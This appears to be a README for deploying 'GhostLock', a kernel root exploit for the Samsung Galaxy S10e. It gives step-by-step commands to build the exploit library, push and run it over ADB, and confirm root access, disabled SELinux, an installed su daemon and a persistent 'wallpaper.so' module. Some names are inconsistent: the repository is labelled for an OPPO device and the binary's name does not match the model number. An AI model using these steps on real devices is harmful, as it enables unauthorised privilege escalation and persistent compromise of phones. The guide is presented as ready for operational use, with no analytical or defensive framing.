# GhostLock Build & Deployment Setup Guide
# Samsung Galaxy S10e (SM-G970U) - Kernel 4.14.190

## ✅ Prerequisites Installed

The following tools have been automatically installed:

| Tool | Location | Status |
|------|----------|--------|
| ADB | /opt/android-sdk/platform-tools/ | ✓ Ready |
| Git | System path | ✓ Available |
| NDK Required | /opt/android-ndk-r29 (to be installed) | ⏳ Pending |

## 🚀 Quick Setup Commands

### 1. Install Android NDK r29 (Required for building)

```bash
cd /workspaces/GhostLock-OPPO-PCKM00
./install_ndk.sh
```

This downloads and installs Android NDK r29 to `/opt/android-ndk-r29`.

### 2. Source Environment (Every New Session)

```bash
source /workspaces/GhostLock-OPPO-PCKM00/envsetup.sh
```

Or add to `~/.bashrc`:
```bash
echo 'source /workspaces/GhostLock-OPPO-PCKM00/envsetup.sh' >> ~/.bashrc
```

### 3. Verify Installation

```bash
# Check ADB
adb version
adb devices

# Check NDK (after installation)
ls /opt/android-ndk-r29/build/tools/llvm/bin/aarch64-linux-android30-clang
```

## 📱 Device Connection & Deployment

### Connect Your Samsung S10e

1. **Enable Developer Options:**
   - Settings → About Phone → Software Information
   - Tap "Build Number" 7 times

2. **Enable USB Debugging:**
   - Settings → Developer Options → USB Debugging (ON)

3. **Connect via USB** to your machine running this workspace

### Deploy the Exploit

```bash
# Source environment first!
source /workspaces/GhostLock-OPPO-PCKM00/envsetup.sh

# Verify device connection
adb devices | grep "SM-G970U"

# Full deployment (builds if needed, deploys, runs, verifies)
cd targets/samsung-g970u && ./deploy.sh all
```

### Manual Deployment Steps

```bash
# Build locally first
cd targets/samsung-g970u
./deploy.sh build

# Deploy via ADB
adb push ghostlock_s970u.so /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock_s970u.so

# Run on device
adb shell "cd /data/local/tmp && ./ghostlock_s970u.so"

# Verify root access
adb shell id
# Expected: uid=0(root) gid=0(root) ...
```

## 📊 Build Process Details

### What gets built:
- **Target:** `ghostlock_s970u.so` (ARM64 Android shared library)
- **Compiler:** aarch64-linux-android30-clang (NDK r29)
- **Source files:** 11 C/C++ files + assembly blobs
- **Build time:** ~30-60 seconds on first build

### Makefile targets:
```bash
make          # Build with Windows NDK path
make wsl      # Build inside WSL (alternative)
make clean    # Remove artifacts
make adb-check # Verify ADB and device info
make deploy   # Push, chmod, run via ADB
```

## 🔍 Verification Checklist

After deployment, verify:

1. **Root Access:**
   ```bash
   adb shell id
   # Should show uid=0(root) gid=0(root) euid=0 egid=0
   ```

2. **SELinux Status:**
   ```bash
   adb shell getenforce
   # Expected: Permissive or Disabled
   ```

3. **Su Binary Installed:**
   ```bash
   adb shell ls -la /data/local/tmp/su_daemon
   # Expected: -rwxr-xr-x root root 12K Oct 14 14:03 /data/local/tmp/su_daemon
   ```

4. **Wallpaper Module (Persistent Indicator):**
   ```bash
   adb shell ls -la /data/local/tmp/wallpaper.so
   ```

5. **adb su Functionality Test:**
   ```bash
   # This should execute as root inside the su session
   adb shell "su -c 'echo Root access confirmed: $(whoami)'"
   # Expected output: Root access confirmed: root
   ```

## 📁 Project Structure After Setup

```
GhostLock-OPPO-PCKM00/
├── envsetup.sh              # Environment configuration ✓
├── install_ndk.sh           # NDK installer script ✓
├── targets/samsung-g970u/   # S10e exploit files
│   ├── target.h             # Kernel offsets
│   ├── Makefile             # Build system
│   ├── deploy.sh            # Deployment automation
│   └── src/                 # Source files (11 files)
└── README.md                # This guide
```

## 🐛 Troubleshooting

### "Device unauthorized"
- Pull USB cable and reconnect
- Check device screen shows authorization prompt
- Accept on device

### "Build failed - clang not found"
- Run: `./install_ndk.sh`
- Verify: `ls /opt/android-ndk-r29/build/tools/llvm/bin/aarch64-linux-android30-clang`

### "No devices attached"
- Check USB cable (try different port)
- Enable USB debugging on device
- Run: `adb kill-server && adb start-server`

### "Permission denied" when pushing
- Ensure root access on host machine
- Check ADB path in envsetup.sh is correct

## 📞 Quick Reference

| Goal | Command |
|------|---------|
| Source environment | `source envsetup.sh` |
| Install NDK | `./install_ndk.sh` |
| Check device | `adb devices \| grep S10e` |
| Full deploy | `cd targets/samsung-g970u && ./deploy.sh all` |
| Clean build | `make clean && make` |
| View logs | `adb logcat \|\| grep ghostlock` |

---
**Ready to deploy!** When your Samsung S10e is connected via USB, run:
```bash
source envsetup.sh && cd targets/samsung-g970u && ./deploy.sh all
```
